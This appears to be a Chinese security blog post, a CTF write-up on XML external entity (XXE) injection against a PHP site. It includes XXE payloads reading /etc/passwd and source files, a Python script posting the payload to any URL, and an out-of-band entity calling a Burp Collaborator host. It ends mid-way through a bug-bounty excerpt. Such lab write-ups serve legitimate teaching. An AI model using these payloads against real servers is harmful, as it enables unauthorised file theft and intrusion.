@@ -1,0 +1,551 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Web-XML External Entity Injection(XXE) | Hustler&#39;s Blog</title>
+  <meta name="author" content="Hustler">
+  
+  <meta name="description" content="Everybody needs love,but hacker dont">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Web-XML External Entity Injection(XXE)"/>
+  <meta property="og:site_name" content="Hustler&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Hustler&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Hustler&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Web-XML External Entity Injection(XXE)</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p><img src="/images/webxxe1.PNG"></p>
+<p><img src="/images/webxxe2.PNG"></p>
+<p>题目给出了一个网站，点击左侧相应的汽车名字就会出现相应的图片和数据。一看没什么问题，那么我们就上burp，给浏览器设置代理，访问192.168.1.101，为什么不是127.0.0.1呢？因为访问这个回环地址burp抓不到包，原因未知但可以使用就好了。</p>
+<p><img src="/images/webxxecap1.PNG"></p>
+<p>观察发现，当我们点击左侧汽车名字的时候，实际上我们是post了相应的请求，抓包修改相应位置的汽车名后发现会跳转到不同的汽车页面。思路这就来了：如果我们post一些其他的东西上去，是否会有突破口？</p>
+<h1 id="尝试突破"><a href="#尝试突破" class="headerlink" title="尝试突破"></a>尝试突破</h1><p>首先，我先post了一个不存在的汽车名称：</p>
+<p><img src="/images/webxxefake1.PNG"></p>
+<p>得到这样一个结果：</p>
+<p><img src="/images/webxxerecv1.PNG"></p>
+<p>看起来没有问题，我又思考，这个页面是用php制作的，于是我post了一段php代码：</p>
+<p><img src="/images/webxxefake2.PNG"></p>
+<p>返回这样一个结果：</p>
+<p><img src="/images/webxxerecv2.PNG"></p>
+<p>这个返回很有意思，直接变成不存在了，看来前面的名字没有了，这网站肯定有些问题，但我不知道问题在哪，于是第三次我直接post了一些垃圾数据：</p>
+<p><img src="/images/webxxefake3.PNG"></p>
+<p>返回了一个报错：</p>
+<p><img src="/images/webxxerecv3.PNG"></p>
+<p>得到了一些有价值的信息，有一个函数“simplexml load string”，上网查了一下，这个函数可以把 XML 字符串载入对象中。 如果失败，则返回 false。那么是不是说，如果我故意post一些经过设计的xml数据，这个函数就会执行我的指令呢，找到突破口了！</p>
+<h1 id="XML-External-Entity-Injection-XXE"><a href="#XML-External-Entity-Injection-XXE" class="headerlink" title="XML External Entity Injection(XXE)"></a>XML External Entity Injection(XXE)</h1><p>于是我上网搜索此函数的相关漏洞，发现了XXE漏洞，以下是其简介：</p>
+<p><strong>漏洞介绍</strong></p>
+<p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p>
+<p>由于站点的建站语言不同，PHP、JAVA、python等也有不同的解析规则，在实际情况中不能一概而论，但原理是相同的。</p>
+<p><strong>XML基础知识</strong></p>
+<p>XML是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。</p>
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下三种：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///path/to/file.ext</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//url</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=conf.php</span></span><br></pre></td></tr></table></figure>
+
+<p>XML在调用外部实体整体的写法如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xdsec</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">methodname</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span>(实体引用名) <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>(实体内容) &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这种写法则调用了本地计算机的文件<code>/etc/passwd</code>，XML内容被解析后，文件内容便通过<code>&amp;xxe</code>被存放在了<code>methodname</code>元素中，造成了敏感信息的泄露。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>接下来的操作就十分简单了，构造恶意代码，并post到容器中：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里直接读取本地的flag并返回到xxe这个变量中，但这串东西不能直接post，要转成url编码格式（连等号也要编码），转化后post到容器：</p>
+<p><img src="/images/webxxeIJ.PNG"></p>
+<p>成功得到flag</p>
+<p> <img src="/images/webxxeflag.PNG"></p>
+<h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.URL 编码&#x2F;解码</p>
+<p>RFC3986 协议对 URL 的编解码问题做出了详细的建议，指出了哪些字符需要被编码才不会引起 URL 语义的转变，以及对为什么这些字符需要编码做出了相应的解释。</p>
+<p>RFC3986 协议规定 URL 只允许包含以下四种字符：<br>                   1、英文字母（a-zA-Z）<br>                   2、数字（0-9）<br>                   3、-_.~ 4个特殊字符<br>                   4、所有保留字符，RFC3986 中指定了以下字符为保留字符（英文字符）：     ! * ‘ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p>
+<p>本工具使用了 <code>JavaScript</code> 的 <code>decodeURIComponent</code> 方法进行解码，<code>encodeURI</code> 和 <code>encodeURIComponent</code> 方法进行编码。</p>
+<p><code>encodeURI</code> 方法不会对ASCII字母、数字、<del>!@#$&amp;*()&#x3D;:&#x2F;,;?+’ 编码。<br><code>encodeURIComponent</code> 方法不会对ASCII字母、数字、</del>!*()’ 编码。<br><code>encodeURIComponent</code> 比 <code>encodeURI</code> 编码的范围大。<br>因此当你需要编码整个 URL，就用 <code>encodeURI</code>。<br>如果只需要编码 URL 中的参数时，就使用 <code>encodeURIComponent</code>。</p>
+<hr>
+<p>2.以下是一些xxe漏洞的总结，摘录于不同博客，附链接</p>
+<p>首先，我们的目标地址是<code>172.16.12.2/simplexml_load_string.php</code></p>
+<p>我们先来看下<code>simplexml_load_string.php</code>代码怎么写的，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;name;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最开始，引入一个<code>file_get_contents</code>函数，将整个XML数据读入<code>data</code>字符串中，然后交给php的xml解析函数<code>simplexml_load_string()</code>解析，解析后的数据赋给<code>xml</code>变量。</p>
+<p>这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。</p>
+<p>我们现在打开<code>Burpsuite</code>，修改浏览器的网络配置，点击最右侧的三个横线，然后依次点击-&gt;选项-&gt;高级-&gt;网络-&gt;配置firefox如何连接互联网</p>
+<p>设置HTTP代理为<code>127.0.0.1</code>，端口为<code>8080</code>，配置完成后，开启burpsuite的拦截功能，然后访问如下网址</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.16.12.2/simplexml_load_string.php</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/burpfirefox.gif"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/burpfirefox.gif" alt="burp-firefox"></a></p>
+<p>当访问请求被burp拦截后，点击action将此请求发送到burp的repeater选项卡(send to repeater)，将如下的XML文本直接写在数据包内容的下面</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/burpsimple.gif"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/burpsimple.gif" alt="burp_simple"></a></p>
+<p>这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中<code>SYSTEM &quot;file:///etc/passwd&quot;</code>部分引用了目标服务器(即<code>172.16.12.2</code>)下的<code>/etc/passwd</code>文件，服务器解析XML内容后，会将这一文件内容存入<code>&amp;xxe</code>中，然后将数据返回给恶意访问者。</p>
+<p>执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上<code>/etc/passwd</code>文件的内容</p>
+<p><a target="_blank" rel="noopener" href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/resultf.png"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/resultf.png" alt="result_s"></a></p>
+<p>如果修改XML中的外部实体为其他协议，如<code>php://filter/read=convert.base64-encode/resource=index.php</code>，在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果在浏览器上显示如下</p>
+<p><a target="_blank" rel="noopener" href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/php.gif"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/php.gif" alt="result_p"></a></p>
+<p>返回值为<code>PD9waHANCnBocGluZm8oKTsNCj8+</code>，经过base64解码，可以看到字符串是index.php的源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们来访问一下index.php，可以看到确实是执行了phpinfo();函数</p>
+<p><a target="_blank" rel="noopener" href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/index.png"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/index.png" alt="index"></a></p>
+<h4 id="步骤2-使用并分析恶意脚本"><a href="#步骤2-使用并分析恶意脚本" class="headerlink" title="步骤2 使用并分析恶意脚本"></a>步骤2 使用并分析恶意脚本</h4><p>请访问**<code>http://file.ichunqiu.com/397qjz4d</code>**下载实验文件。</p>
+<p>打开cmd，输入 <code>python 脚本所在路径\xxe-url2.py</code>(可将脚本直接拖入cmd命令行) ，然后输入要读取的文件及要访问的地址.</p>
+<p>如下图所示，脚本放在<code>C:\Documents and Settings\Administrator\My Documents\下载\</code>路径下，运行脚本，输入示例payload</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>示例地址</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.16.12.2/simplexml_load_string.php</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://static2.ichunqiu.com/icq/resources/fileupload/60475/poc.gif"><img src="https://static2.ichunqiu.com/icq/resources/fileupload/60475/poc.gif" alt="poc"></a></p>
+<p><code>xxe-url2.py</code>的代码如下，通过<code>urllib2</code>的request方法用POST方式向目标地址发送XML数据，返回的数据即为服务器<code>172.16.12.2</code>下的<code>/etc/passwd</code>文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;输入要读取的文件，如file:///etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;输入要访问的地址，如http://172.16.12.2/simplexml_load_string.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    url = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#url = &#x27;http://192.168.70.235/simplexml_load_string.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;text/xml&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    xml = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;&#x27;</span> + payload + <span class="string">&#x27;&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    req = urllib2.Request(url = url,headers = headers, data = xml)</span><br><span class="line"></span><br><span class="line">    res_data = urllib2.urlopen(req)</span><br><span class="line"></span><br><span class="line">    res = res_data.read()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> res</span><br></pre></td></tr></table></figure>
+
+<h4 id="实验结果分析与总结"><a href="#实验结果分析与总结" class="headerlink" title="实验结果分析与总结"></a>实验结果分析与总结</h4><p>本次实验主要了解了XML的基础知识以及PHP中XML的使用，了解了漏洞出现的原理，学习了通过构造恶意的外部实体访问，让服务器读取敏感文件内容的恶意操作。</p>
+<p>XML外部实体注入可以造成的危害有：</p>
+<ul>
+<li>任意文件读取</li>
+<li>系统命令执行</li>
+<li>内网主机及服务探测</li>
+</ul>
+<p>本次实验我们主要进行了任意文件读取的操作，系统命令执行需要在安装了EXPECT扩展的PHP环境下才能执行，内网主机及服务探测可以通过HTTP协议来执行。</p>
+<h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><ul>
+<li>使用libxml2.8.0以上版本xml解析库，默认禁止外部实体的解析</li>
+<li>对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以加载实体前可以调用函数进行过滤</li>
+<li>可将外部实体、参数实体和内联DTD都被设置为false，从而避免基于XXE漏洞的攻击。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cui0x01/p/8823690.html">https://www.cnblogs.com/cui0x01/p/8823690.html</a></p>
+<hr>
+<p>为什么这个端点能够引起我的注意，是因为这个端点响应的是一个简单的<code>XML</code>结构的错误信息和404。</p>
+<p>请求：</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> /interesting/ HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="symbol">Host:</span> server.company.com</span><br></pre></td></tr></table></figure>
+
+<p>响应</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">404</span> <span class="built_in">Not</span> Found</span><br><span class="line"><span class="symbol">Server:</span> nginx</span><br><span class="line"><span class="symbol">Date:</span> Tue, <span class="number">04</span> Dec <span class="number">2018</span> <span class="number">10</span>:<span class="number">08</span>:<span class="number">18</span> GMT</span><br><span class="line">Content-Type: <span class="keyword">text</span>/xml</span><br><span class="line">Content-Length: <span class="number">189</span></span><br><span class="line"><span class="symbol">Connection:</span> keep-alive</span><br><span class="line"></span><br><span class="line">&lt;result&gt;</span><br><span class="line">&lt;errors&gt;</span><br><span class="line">&lt;<span class="keyword">error</span>&gt;The request <span class="built_in">is</span> invalid: The requested resource could <span class="built_in">not</span> be found.&lt;/<span class="keyword">error</span>&gt;</span><br><span class="line">&lt;/errors&gt;</span><br><span class="line">&lt;/result&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我改变请求的方法为<code>POST</code>时，在<code>header</code>头部添加 <code>Content-Type: application/xml</code>并在<code>POST</code>数据中添加了一个不合法的<code>XML</code>数据，响应更加说明这里有<code>XXE</code>漏洞了。</p>
+<p>请求：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /interesting/ HTTP/1.1</span><br><span class="line"><span class="section">Host: server.company.com</span></span><br><span class="line"><span class="section">Content-Type: application/xml</span></span><br><span class="line"><span class="section">Content-Length: 30</span></span><br><span class="line"></span><br><span class="line">&lt;xml version=<span class="string">&quot;abc&quot;</span> ?&gt;</span><br><span class="line">&lt;Doc/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">errors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error</span>&gt;</span>The request is invalid: The request content was malformed:</span><br><span class="line">XML version &quot;abc&quot; is not supported, only XML 1.0 is supported.<span class="tag">&lt;/<span class="name">error</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">errors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是当我发送一个正确的结构化的<code>XML</code>文档时：<br>请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /interesting/ HTTP/1.1</span><br><span class="line">Host: server.company.com</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Doc</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">errors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error</span>&gt;</span>Authentication failed: The resource requires authentication, which was not supplied with the request<span class="tag">&lt;/<span class="name">error</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">errors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意了，服务器明显需要凭证，在交互的过程中。遗憾的是，没有文档说明应该如何提供凭证，我也无法在任何地方找到可能有效的凭证。这可能是个坏消息，因为我以前遇到的许多XXE漏洞需要与端点进行某种“有效”交互。如果没有身份验证，利用这个漏洞可能会变得困难得多。</p>
+<p>但是现在还没有必要担心!在任何情况下，您都应该尝试包含<code>DOCTYPE</code>定义的字串，以查看是否完全禁止使用外部实体，或者是否可以继续追求乐趣和回报。所以我试着发送了如下请求包:</p>
+<p>请求</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://59c99fu65h6mqfmhf5agv1aptgz6nv.burpcollaborator.net/x&quot;</span>&gt;</span> %ext;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>响应：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The server was not able <span class="selector-tag">to</span> produce <span class="selector-tag">a</span> timely response <span class="selector-tag">to</span> your request.</span><br></pre></td></tr></table></figure>
+
+<p>我看了下我的<code>Burp Collaborator</code>交互界面，没有期望的<code>HTTP</code>请求，只有如下部分。</p>
+<p>幸运的是！服务器明显解析了我的域名，但是没有<code>HTTP</code>请求。此外，注意到了服务器在几秒之后出现500错误。</p>
+<p>看起来像防火墙起作用了。我继续尝试进行针对不同端口的出站<code>HTTP</code>请求。但是没有可以达到效果的。所有端口都超时了，显示受影响的服务器至少可以依赖防火墙成功地阻止所有非预期的出站流量。给网络安全团队5分!</p>
+<h2 id="只能做-blind-xxe"><a href="#只能做-blind-xxe" class="headerlink" title="只能做 blind xxe"></a>只能做 blind xxe</h2><p>在这一点上，我有一个有趣的发现，但还没有什么真正值得说明的。通过尝试访问本地文件、内部网络和内部服务，我希望能够从中获得一份中危的报告。</p>
